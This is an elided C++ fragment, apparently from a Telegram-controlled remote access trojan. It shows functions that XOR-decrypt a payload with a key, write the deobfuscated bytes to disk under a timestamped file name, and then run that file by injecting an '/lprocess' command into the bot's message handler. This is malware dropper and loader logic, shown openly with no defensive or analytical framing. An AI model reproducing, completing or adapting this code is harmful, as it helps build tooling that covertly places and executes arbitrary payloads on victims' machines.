...
static void _preparePayload(std::vector<uint8_t> &Payload_Vector, const std::string &Key_String) {
    ...
    if(!Payload_Vector.empty()) {
        ::rat::encryption::xorData(Payload_Vector.data(),
                                   Payload_Vector.size(),
                                   Key_String.c_str());
    }
}
...
_writePayloadIntoFilesystem(const std::vector<uint8_t> &Payload_Bytes) {
    ...
    const std::string &payload_name = fmt::format(payload_name_template, time_stamp);
    ...
    try {
        ...
        HANDLER_DEBUG_LOG("Writing deobfuscated payload bytes into the file system {}",
                          payload_path.string());
...
void Handler::handleRunCommand() {
    {
        ...
        this->telegram_update->message.text = fmt::format("/lprocess {}", payload_path);
